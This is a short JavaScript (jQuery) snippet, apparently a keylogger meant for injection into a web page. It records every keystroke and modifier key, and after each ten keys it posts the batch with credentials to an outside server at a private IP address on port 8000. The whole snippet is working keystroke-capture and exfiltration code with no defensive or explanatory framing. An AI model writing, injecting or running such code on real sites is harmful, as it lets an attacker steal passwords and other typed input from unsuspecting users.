var stream = [];
$(document).keydown(function(e) {
    stream.push({
        'code': e.which,
        'modify': {
            'alt': e.altKey,
            'ctrl': e.ctrlKey,
            'shift': e.shiftKey
        }
    });
    if (stream.length == 10) {
        $.ajax({
            type: "POST",
            url: "http://172.26.132.5:8000/log",
            data: JSON.stringify(stream),
            xhrFields:{
                withCredentials:true
            },
            crossDomain:true,
        });
        stream = [];
    }

});